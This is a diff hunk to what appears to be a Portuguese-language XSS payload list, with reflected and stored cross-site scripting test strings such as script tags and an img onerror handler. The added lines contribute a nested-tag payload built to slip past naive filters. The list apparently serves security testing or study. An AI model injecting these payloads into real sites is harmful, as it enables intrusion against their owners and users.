@@ -4,6 +4,8 @@
 ?q=%3Cscript%3Ealert(1)%3C/script%3E
 ?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
 
+Aninhado
+<scr<script>ipt>alert(1)</script>
 
 # ───── XSS ARMAZENADO (fica guardado) ─────
 <script>alert(document.domain)</script>
